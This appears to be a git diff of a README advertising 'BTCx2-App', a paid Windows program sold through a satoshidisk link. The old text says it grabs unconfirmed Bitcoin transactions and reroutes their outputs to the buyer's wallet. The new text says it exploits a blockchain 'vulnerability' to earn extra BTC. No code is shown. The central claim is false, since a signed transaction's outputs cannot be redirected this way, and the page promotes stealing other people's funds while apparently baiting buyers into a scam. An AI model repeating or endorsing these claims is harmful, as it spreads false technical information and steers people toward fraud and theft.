@@ -1,9 +1,8 @@
 # BTCx2-App
-blockchain transaction grabber + re-router
-The application, once installed, allows you to select an unconfirmed transaction from blockchain.com/explorer and will reroute the output into a wallet address of your choosing.
+Exploitation of a current vulnerability in the blockchain and its miners due to the flooded nature of the BTC market and the B.C. So it won't last forever better make some extra BTC while you can
 
 requirements - Windows 10
 
 to get the app visit 
  https://satoshidisk.com/pay/C9LSIC 
- a little pricy but sooo worth it. 
+ a little spendy but sooo worth it. 
